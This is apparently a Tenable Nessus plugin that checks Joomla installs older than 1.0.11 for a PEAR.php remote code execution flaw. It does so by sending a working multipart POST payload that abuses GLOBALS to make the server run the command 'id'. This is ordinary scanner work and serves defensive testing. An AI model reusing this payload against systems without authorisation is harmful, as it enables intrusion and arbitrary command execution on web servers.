#
# (C) Tenable Network Security
#

include("compat.inc");

if (description)
{
  script_id(22298);
  script_version("$Revision: 1.11 $");

  script_cve_id("CVE-2005-3390","CVE-2006-4469");
  script_bugtraq_id(15250, 19749);
  script_xref(name:"OSVDB", value:"20408");
  script_xref(name:"OSVDB", value:"28341");

  script_name(english:"Joomla! < 1.0.11 Unspecified Remote Code Execution");
  script_summary(english:"Tries to run a command in Joomla");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows execution of
arbitrary PHP code." );
 script_set_attribute(attribute:"description", value:
"The 'includes/PEAR/PEAR.php' script included with the version of
Joomla installed on the remote host contains a programming flaw that
may allow an unauthenticated remote attacker to execute arbitrary PHP
code on the affected host, subject to the privileges of the web server
user id. 

Note that successful exploitation of this issue requires that PHP's
'register_globals' setting be enabled and that the remote version of
PHP be older than 4.4.1 or 5.0.6." );
 script_set_attribute(attribute:"see_also", value:"http://www.hardened-php.net/globals-problem" );
 script_set_attribute(attribute:"see_also", value:"http://www.joomla.org/content/view/1843/74/" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Joomla version 1.0.11 or later and/or PHP version 4.4.1 /
5.0.6." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "joomla_detect.nasl", "no404.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);
if (get_kb_item("www/no404/" + port)) exit(0);

# Test an install.
install = get_kb_item(string("www/", port, "/joomla"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Make sure the affected script exists.
  url = string(dir, "/includes/PEAR/PEAR.php");
  r = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(r)) exit(0);

  # If it does...
  #
  # nb: the script generally doesn't respond when called directly.
  if (egrep(string:r[0], pattern:"^HTTP/.* 200 OK"))
  {
    # Try to exploit the flaw to execute a command.
    cmd = "id";
    bound = "bound";

    boundary = string("--", bound);
    postdata = string(
      boundary, "\r\n", 
      'Content-Disposition: form-data; name="GLOBALS"; filename="nessus";', "\r\n",
      "Content-Type: image/jpeg;\r\n",
      "\r\n",
      SCRIPT_NAME, "\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="_PEAR_shutdown_funcs[a][0]"', "\r\n",
      "Content-Type: text/plain\r\n",
      "\r\n",
      "system\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="_PEAR_shutdown_funcs[a][1]"', "\r\n",
      "Content-Type: text/plain\r\n",
      "\r\n",
      cmd, "\r\n",

      boundary, "--", "\r\n"
    );
    r = http_send_recv3(method: "POST ", item: url, version: 11, data: postdata, port: port,
add_headers: make_array("Content-Type", "multipart/form-data; boundary="+bound));
    if (isnull(r)) exit(0);
    res = r[2];

    line = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res);
    if (line)
    {
      if (report_verbosity < 1) report = NULL;
      else report = string(
        "Nessus was able to execute the command 'id' on the remote host,\n",
        "which produced the following output :\n",
        "\n",
        line
      );
      security_hole(port:port, extra:report);
      exit(0);
    }
  }
}
